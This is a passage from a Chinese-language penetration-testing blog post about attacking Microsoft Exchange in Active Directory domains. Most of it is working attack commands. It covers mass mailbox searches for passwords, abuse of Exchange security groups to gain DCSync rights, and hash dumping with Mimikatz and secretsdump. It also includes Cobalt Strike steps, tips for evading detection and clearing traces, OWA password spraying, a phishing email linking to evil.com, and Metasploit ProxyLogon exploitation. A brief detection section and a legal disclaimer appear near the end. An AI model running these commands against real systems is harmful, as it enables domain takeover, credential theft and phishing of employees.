<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">admin@rootkit.org -&gt; rootkit\administrator</span><br><span class="line">jerry@rootkit.org -&gt; rootkit\jerry</span><br><span class="line">backup@rootkit.org -&gt; rootkit\backup_admin</span><br></pre></td></tr></table></figure>

<p><strong>利用价值</strong>：</p>
<ul>
<li>将邮箱地址映射到 AD 账户</li>
<li>识别服务账户和管理员账户</li>
<li>为密码喷洒攻击准备用户名列表</li>
</ul>
<hr>
<h2 id="域管权限下的全局邮件搜索"><a href="#域管权限下的全局邮件搜索" class="headerlink" title="域管权限下的全局邮件搜索"></a>域管权限下的全局邮件搜索</h2><h3 id="原理-6"><a href="#原理-6" class="headerlink" title="原理"></a>原理</h3><p>如果已经获取域管理员权限，可以使用 Exchange 的模拟（Impersonation）功能搜索所有用户的邮箱。</p>
<h3 id="实战操作-5"><a href="#实战操作-5" class="headerlink" title="实战操作"></a>实战操作</h3><p><strong>1. 使用域管账户搜索所有邮箱</strong>：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-GlobalMailSearch</span> <span class="literal">-ImpersonationAccount</span> sqladmin <span class="literal">-ExchHostname</span> OWA2010SP3 <span class="literal">-AdminUserName</span> <span class="number">0</span>day\administrator <span class="literal">-AdminPassword</span> admin!<span class="selector-tag">@</span><span class="comment">#45 -Term &quot;*pass*&quot; -Folder all -OutputCsv all_passwords.csv</span></span><br></pre></td></tr></table></figure>

<p><strong>参数说明</strong>：</p>
<ul>
<li><code>-ImpersonationAccount</code>：用于模拟的账户（通常是 Exchange 服务账户）</li>
<li><code>-AdminUserName</code>：域管理员账户</li>
<li><code>-AdminPassword</code>：域管理员密码</li>
<li><code>-Term</code>：搜索关键词</li>
<li><code>-OutputCsv</code>：输出文件</li>
</ul>
<p><strong>2. 搜索中文关键词</strong>：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-GlobalMailSearch</span> <span class="literal">-ImpersonationAccount</span> sqladmin <span class="literal">-ExchHostname</span> OWA2010SP3 <span class="literal">-AdminUserName</span> <span class="number">0</span>day\sqladmin <span class="literal">-AdminPassword</span> admin!<span class="selector-tag">@</span><span class="comment">#45 -Term &quot;*测试*&quot; -Folder all -OutputCsv test_results.csv</span></span><br></pre></td></tr></table></figure>

<p><strong>3. 批量搜索多个关键词</strong>：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$keywords</span> = <span class="selector-tag">@</span>(<span class="string">&quot;*pass*&quot;</span>, <span class="string">&quot;*vpn*&quot;</span>, <span class="string">&quot;*admin*&quot;</span>, <span class="string">&quot;*root*&quot;</span>, <span class="string">&quot;*secret*&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$keyword</span> <span class="keyword">in</span> <span class="variable">$keywords</span>) &#123;</span><br><span class="line">    <span class="variable">$outfile</span> = <span class="string">&quot;search_<span class="variable">$</span>(<span class="variable">$keyword</span>.Replace(&#x27;*&#x27;,&#x27;&#x27;)).csv&quot;</span></span><br><span class="line">    <span class="built_in">Invoke-GlobalMailSearch</span> <span class="literal">-ImpersonationAccount</span> sqladmin <span class="literal">-ExchHostname</span> OWA2010SP3 <span class="literal">-AdminUserName</span> <span class="number">0</span>day\administrator <span class="literal">-AdminPassword</span> admin!<span class="selector-tag">@</span><span class="comment">#45 -Term $keyword -Folder all -OutputCsv $outfile</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="Exchange-特殊组权限提升"><a href="#Exchange-特殊组权限提升" class="headerlink" title="Exchange 特殊组权限提升"></a>Exchange 特殊组权限提升</h1><h2 id="Exchange-权限模型"><a href="#Exchange-权限模型" class="headerlink" title="Exchange 权限模型"></a>Exchange 权限模型</h2><h3 id="Exchange-安全组"><a href="#Exchange-安全组" class="headerlink" title="Exchange 安全组"></a>Exchange 安全组</h3><p>安装 Exchange 后，会在 Active Directory 中自动创建一个名为 <code>Microsoft Exchange Security Groups</code> 的 OU（组织单位），其中包含多个特殊的安全组。</p>
<p><strong>关键安全组</strong>：</p>
<ol>
<li><p><strong>Exchange Trusted Subsystem</strong></p>
<ul>
<li>Exchange 服务的核心安全组</li>
<li>默认是 <code>Exchange Windows Permissions</code> 组的成员</li>
<li>继承对域对象的 WriteDACL 权限</li>
</ul>
</li>
<li><p><strong>Exchange Windows Permissions</strong></p>
<ul>
<li>对域对象具有 WriteDACL 权限</li>
<li>可以修改域对象的访问控制列表（ACL）</li>
</ul>
</li>
</ol>
<p><img src="/2026/02/12/exchange/6.webp" loading='lazy'></p>
<hr>
<h2 id="WriteDACL-权限详解"><a href="#WriteDACL-权限详解" class="headerlink" title="WriteDACL 权限详解"></a>WriteDACL 权限详解</h2><h3 id="什么是-WriteDACL"><a href="#什么是-WriteDACL" class="headerlink" title="什么是 WriteDACL"></a>什么是 WriteDACL</h3><p><strong>DACL（Discretionary Access Control List）</strong> 是 Windows 访问控制的核心机制，用于定义谁可以访问对象以及拥有什么权限。</p>
<p><strong>WriteDACL 权限</strong> 允许用户修改对象的 DACL，从而控制其他用户对该对象的访问权限。</p>
<h3 id="WriteDACL-的危害"><a href="#WriteDACL-的危害" class="headerlink" title="WriteDACL 的危害"></a>WriteDACL 的危害</h3><p>拥有 WriteDACL 权限的用户可以：</p>
<ol>
<li><strong>添加或删除访问控制条目（ACE）</strong>：授予或撤销其他用户的访问权限</li>
<li><strong>修改访问控制条目</strong>：更改权限级别、编辑用户或组的成员资格</li>
<li><strong>修改访问控制规则</strong>：更改继承规则、继承层次结构</li>
<li><strong>控制对象的安全性</strong>：确保只有授权的用户能够访问该对象</li>
</ol>
<h3 id="在域环境中的利用"><a href="#在域环境中的利用" class="headerlink" title="在域环境中的利用"></a>在域环境中的利用</h3><p>默认情况下：</p>
<ul>
<li><code>Exchange Windows Permissions</code> 对域对象具有 WriteDACL 权限</li>
<li><code>Exchange Trusted Subsystem</code> 继承 WriteDACL 权限</li>
</ul>
<p><strong>攻击路径</strong>：</p>
<ol>
<li>将普通域用户添加到 <code>Exchange Trusted Subsystem</code> 组</li>
<li>该用户继承 WriteDACL 权限</li>
<li>使用 WriteDACL 权限授予自己 DCSync 权限</li>
<li>执行 DCSync 攻击导出域内所有用户的密码哈希</li>
</ol>
<hr>
<h2 id="利用-Exchange-组提权"><a href="#利用-Exchange-组提权" class="headerlink" title="利用 Exchange 组提权"></a>利用 Exchange 组提权</h2><h3 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h3><ol>
<li>已获取域内普通用户权限</li>
<li>目标域安装了 Exchange Server</li>
<li><code>Exchange Trusted Subsystem</code> 组存在且具有 WriteDACL 权限</li>
</ol>
<hr>
<h3 id="攻击步骤"><a href="#攻击步骤" class="headerlink" title="攻击步骤"></a>攻击步骤</h3><p><strong>第一步：将用户添加到 Exchange Trusted Subsystem 组</strong></p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 使用域管理员权限（如果已有）</span><br><span class="line"><span class="built_in">net</span> group &quot;Exchange Trusted Subsystem&quot; micle /add /domain</span><br><span class="line"></span><br><span class="line"># 或使用 PowerShell</span><br><span class="line">Add-ADGroupMember -Identity &quot;Exchange Trusted Subsystem&quot; -Members micle</span><br></pre></td></tr></table></figure>

<p><strong>第二步：重新获取会话</strong></p>
<p>添加到组后，需要重新登录或获取新的 Kerberos 票据，才能继承新的权限。</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 方法<span class="number">1</span>：重新登录</span><br><span class="line">runas /user:<span class="number">0</span>day\micle <span class="built_in">cmd</span></span><br><span class="line"></span><br><span class="line"># 方法<span class="number">2</span>：刷新 Kerberos 票据</span><br><span class="line">klist purge</span><br><span class="line">klist</span><br></pre></td></tr></table></figure>

<p><strong>第三步：授予自己 DCSync 权限</strong></p>
<p>使用 PowerView 或 PowerSploit 授予 DCSync 权限：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入 PowerView</span></span><br><span class="line"><span class="built_in">Import-Module</span> .\PowerView.ps1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 授予 DCSync 权限（Replicating Directory Changes）</span></span><br><span class="line"><span class="built_in">Add-DomainObjectAcl</span> <span class="literal">-TargetIdentity</span> <span class="string">&quot;DC=0day,DC=org&quot;</span> <span class="literal">-PrincipalIdentity</span> micle <span class="literal">-Rights</span> DCSync <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>

<p>或使用 ntlmrelayx：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在 Linux 上使用 Impacket</span></span><br><span class="line">ntlmrelayx.py -t ldap://192.168.3.10 --escalate-user micle</span><br></pre></td></tr></table></figure>

<p><strong>第四步：执行 DCSync 攻击</strong></p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 使用 Mimikatz</span><br><span class="line">mimikatz.exe &quot;lsadump::dcsync /domain:<span class="number">0</span>day.org /user:administrator&quot; <span class="keyword">exit</span></span><br><span class="line"></span><br><span class="line"># 使用 Impacket</span><br><span class="line">secretsdump.py <span class="number">0</span>day/micle:password@<span class="number">192</span>.<span class="number">168</span>.<span class="number">3</span>.<span class="number">10</span> -just-dc-user administrator</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="使用-Cobalt-Strike-自动化利用"><a href="#使用-Cobalt-Strike-自动化利用" class="headerlink" title="使用 Cobalt Strike 自动化利用"></a>使用 Cobalt Strike 自动化利用</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在 Beacon 中执行</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 添加用户到 Exchange Trusted Subsystem</span></span><br><span class="line">shell net group <span class="string">&quot;Exchange Trusted Subsystem&quot;</span> /add micle /domain</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 等待几秒钟让权限生效</span></span><br><span class="line"><span class="built_in">sleep</span> 5</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 使用 PowerView 授予 DCSync 权限</span></span><br><span class="line">powershell-import /path/to/PowerView.ps1</span><br><span class="line">powerpick Add-DomainObjectAcl -TargetIdentity <span class="string">&quot;DC=0day,DC=org&quot;</span> -PrincipalIdentity micle -Rights DCSync</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 执行 DCSync</span></span><br><span class="line">dcsync 0day.org administrator</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="检测与防御"><a href="#检测与防御" class="headerlink" title="检测与防御"></a>检测与防御</h2><h3 id="蓝队检测"><a href="#蓝队检测" class="headerlink" title="蓝队检测"></a>蓝队检测</h3><p><strong>1. 监控 Exchange 安全组的成员变化</strong>：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 定期审计 Exchange Trusted Subsystem 组成员</span></span><br><span class="line"><span class="built_in">Get-ADGroupMember</span> <span class="literal">-Identity</span> <span class="string">&quot;Exchange Trusted Subsystem&quot;</span> | <span class="built_in">Select</span> Name, SamAccountName</span><br></pre></td></tr></table></figure>

<p><strong>2. 监控 DCSync 攻击</strong>：</p>
<ul>
<li>Event ID 4662：对 AD 对象的操作</li>
<li>关注 <code>Replicating Directory Changes</code> 权限的使用</li>
</ul>
<p><strong>3. 监控 WriteDACL 权限的滥用</strong>：</p>
<ul>
<li>Event ID 5136：目录服务对象被修改</li>
<li>关注 <code>nTSecurityDescriptor</code> 属性的修改</li>
</ul>
<hr>
<h3 id="红队规避"><a href="#红队规避" class="headerlink" title="红队规避"></a>红队规避</h3><p><strong>1. 使用临时账户</strong>：</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 创建临时账户</span><br><span class="line"><span class="built_in">net</span> user tempuser Pass123! /add /domain</span><br><span class="line"><span class="built_in">net</span> group &quot;Exchange Trusted Subsystem&quot; tempuser /add /domain</span><br><span class="line"></span><br><span class="line"># 执行 DCSync</span><br><span class="line"># ...</span><br><span class="line"></span><br><span class="line"># 清理痕迹</span><br><span class="line"><span class="built_in">net</span> group &quot;Exchange Trusted Subsystem&quot; tempuser /<span class="built_in">del</span> /domain</span><br><span class="line"><span class="built_in">net</span> user tempuser /<span class="built_in">del</span> /domain</span><br></pre></td></tr></table></figure>

<p><strong>2. 使用现有的 Exchange 服务账户</strong>：</p>
<p>如果已经获取了 Exchange 服务账户的凭证，直接使用该账户执行 DCSync，避免修改组成员。</p>
<p><strong>3. 限制 DCSync 的范围</strong>：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 只导出特定用户的哈希，避免导出整个域</span></span><br><span class="line">mimikatz.exe <span class="string">&quot;lsadump::dcsync /domain:0day.org /user:administrator&quot;</span> <span class="keyword">exit</span></span><br></pre></td></tr></table></figure>

<hr>
<h1 id="Exchange-其他攻击面"><a href="#Exchange-其他攻击面" class="headerlink" title="Exchange 其他攻击面"></a>Exchange 其他攻击面</h1><h2 id="OWA-暴力破解"><a href="#OWA-暴力破解" class="headerlink" title="OWA 暴力破解"></a>OWA 暴力破解</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 Ruler 工具</span></span><br><span class="line">ruler --domain 0day.org --url https://192.168.3.144/autodiscover/autodiscover.xml brute --<span class="built_in">users</span> users.txt --passwords passwords.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 MailSniper</span></span><br><span class="line">Invoke-PasswordSprayOWA -ExchHostname 192.168.3.144 -UserList users.txt -Password Spring2024!</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="EWS-接口利用"><a href="#EWS-接口利用" class="headerlink" title="EWS 接口利用"></a>EWS 接口利用</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 Ruler 获取邮箱访问权限</span></span><br><span class="line">ruler --domain 0day.org --username jerry --password Admin12345 --email jerry@rootkit.org --url https://192.168.3.144/autodiscover/autodiscover.xml display</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送钓鱼邮件</span></span><br><span class="line">ruler --domain 0day.org --username jerry --password Admin12345 --email jerry@rootkit.org send --to admin@rootkit.org --subject <span class="string">&quot;Urgent: Password Reset&quot;</span> --body <span class="string">&quot;Please click the link to reset your password: http://evil.com/reset&quot;</span></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="ProxyLogon-ProxyShell-漏洞"><a href="#ProxyLogon-ProxyShell-漏洞" class="headerlink" title="ProxyLogon &#x2F; ProxyShell 漏洞"></a>ProxyLogon &#x2F; ProxyShell 漏洞</h2><p>如果 Exchange 版本较旧，可以利用已知的 RCE 漏洞：</p>
<ul>
<li><strong>CVE-2021-26855</strong>（ProxyLogon）：SSRF 漏洞</li>
<li><strong>CVE-2021-34473</strong>（ProxyShell）：路径混淆 + 权限提升</li>
<li><strong>CVE-2021-34523</strong>（ProxyShell）：权限提升</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 Metasploit</span></span><br><span class="line">use exploit/windows/http/exchange_proxylogon_rce</span><br><span class="line"><span class="built_in">set</span> RHOSTS 192.168.3.144</span><br><span class="line"><span class="built_in">set</span> LHOST 192.168.1.100</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>Exchange 服务器是内网渗透的高价值目标，成功利用 Exchange 可以：</p>
<ol>
<li><p><strong>信息收集</strong>：</p>
<ul>
<li>导出完整的组织架构和通讯录</li>
<li>搜索邮件中的敏感信息（密码、VPN、文档）</li>
</ul>
</li>
<li><p><strong>权限提升</strong>：</p>
<ul>
<li>利用 Exchange 安全组的 WriteDACL 权限</li>
<li>执行 DCSync 攻击获取域管理员哈希</li>
</ul>
</li>
<li><p><strong>横向移动</strong>：</p>
<ul>
<li>使用邮件中的凭证访问其他系统</li>
<li>通过钓鱼邮件扩大攻击面</li>
</ul>
</li>
<li><p><strong>持久化</strong>：</p>
<ul>
<li>在 Exchange 服务器上部署后门</li>
<li>利用邮箱规则实现持久化</li>
</ul>
</li>
</ol>
<p><strong>防御建议</strong>：</p>
<ul>
<li>定期审计 Exchange 安全组成员</li>
<li>监控 DCSync 攻击和 WriteDACL 权限滥用</li>
<li>及时安装 Exchange 安全补丁</li>
<li>限制 EWS API 的访问权限</li>
<li>启用多因素认证（MFA）</li>
</ul>
<p>记住：Exchange 渗透技术需要在授权的渗透测试环境中使用，未经授权的攻击行为属于违法行为。</p>
</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a><a class="post-meta__tags" href="/tags/Exchange/">Exchange</a></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related  no-desc" href="/2026/02/15/yu1/" title="域渗透之横向移动"><img class="cover" src="/img/covers/shinchan-cover-12.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post" loading='lazy'><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">域渗透之横向移动</div></div></div></a><a class="pagination-related  no-desc" href="/2026/02/11/cs2/" title="Shellcode 加密加载技术实战"><img class="cover" src="/img/covers/shinchan-cover-02.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post" loading='lazy'><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">Shellcode 加密加载技术实战</div></div></div></a></nav></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By Kenny</span></div><div class="footer_custom_text"><div class="footer-links"><a class="footer-link" href="https://yyyxxx.cc" target="_blank" rel="noopener noreferrer">友情链接：映雪安全</a><a class="footer-link" href="https://qm.qq.com/q/QNgesnj1aU" target="_blank" rel="noopener noreferrer">QQ群：点击加群</a></div></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"></div><div id="rightside-config-show"><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.4"></script><script src="/js/main.js?v=5.5.4"></script><div class="js-pjax"></div><script>
(() => {
  const imageSelectors = "#article-container img, #recent-posts img, .article-sort-item-img img";
  const addFallback = (img) => {
    if (!img || img.dataset.ipFallbackBound === "1") return;
    img.dataset.ipFallbackBound = "1";
    img.addEventListener("error", () => {
      const original = img.getAttribute("src") || "";
      if (!original) return;
      if (img.dataset.ipFallbackDone === "1") return;
      img.dataset.ipFallbackDone = "1";
      if (/\.webp(\?.*)?$/i.test(original)) {
        img.onerror = () => {
          img.onerror = null;
          img.src = original.replace(/\.webp(\?.*)?$/i, ".jpg$1");
          img.onerror = () => {
            img.onerror = null;
            img.src = "/img/404.jpg";
          };
        };
        img.src = original.replace(/\.webp(\?.*)?$/i, ".png$1");
        return;
      }
      img.onerror = null;
      img.src = "/img/404.jpg";
    });
  };
  const bindAll = () => document.querySelectorAll(imageSelectors).forEach(addFallback);
  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", bindAll);
  } else {
    bindAll();
  }
  document.addEventListener("pjax:complete", bindAll);
})();
</script>
</div></body></html>